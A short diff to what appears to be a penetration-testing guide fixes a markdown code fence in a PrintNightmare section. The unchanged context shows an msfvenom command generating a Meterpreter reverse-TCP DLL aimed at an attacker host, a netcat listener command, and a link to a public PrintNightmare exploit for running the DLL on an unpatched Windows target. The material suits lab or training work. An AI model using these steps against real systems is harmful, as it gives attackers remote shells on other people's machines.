@@ -99,7 +99,7 @@ Target Windows machine must have Print Spooler service enabled and unpatched.
    - Generate a payload using msfvenom
    ```bash
    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<our-ip> LPORT=<LISTENING_PORT> -f dll -o payload.dll
-   ``
+   ```
    - Start a netcat listener `nc -nlvp <LISTENING_PORT>`
    - Download and use [PrintNightmare exploit](https://github.com/nathanealm/PrintNightmare-Exploit) to execute a malicious DLL.
    ```bash
